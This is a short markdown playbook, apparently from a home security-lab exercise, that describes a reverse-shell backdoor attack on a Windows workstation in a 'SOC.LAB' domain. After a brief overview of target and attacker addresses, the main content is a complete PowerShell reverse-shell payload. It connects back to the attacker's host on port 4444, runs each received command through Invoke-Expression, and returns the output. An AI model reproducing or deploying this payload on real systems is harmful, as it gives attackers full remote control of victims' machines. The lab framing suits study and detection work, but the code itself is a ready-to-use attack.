# Reverse Shell Backdoor Attack Playbook

## Overview

- **Target:** Windows Workstation (SOC.LAB domain)
  - **IP Address:** 192.168.10.20
  - **Domain:** SOC.LAB

- **Attacker:** Kali Linux
  - **IP Address:** 192.168.20.30

## Objective

The objective of this attack is to create a malicious PowerShell script that establishes a reverse shell backdoor. The attacker will then make the victim download and execute the payload, allowing full control of the target machine. This exercise demonstrates how to achieve persistence and execute arbitrary commands on the Windows workstation.

## Attack Execution Timeline

### 1. **Create Malicious PowerShell Payload**

The first step was to create the malicious PowerShell script (`malicious.ps1`) that would initiate a reverse shell connection back to the attacker. The payload was as follows:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send a message to confirm the connection
$writer.WriteLine("Connected to backdoor!")
$writer.Flush()

while ($true) {
    # Receive command from the attacker
    $command = $reader.ReadLine()
    
    # If the command is "exit", close the connection
    if ($command -eq "exit") {
        break
    }
    
    # Execute the command on the Windows machine and capture output
    $output = Invoke-Expression $command 2>&1
    
    # Send the output back to the attacker
    $writer.WriteLine($output)
    $writer.Flush()
}

# Close the connection
$client.Close()
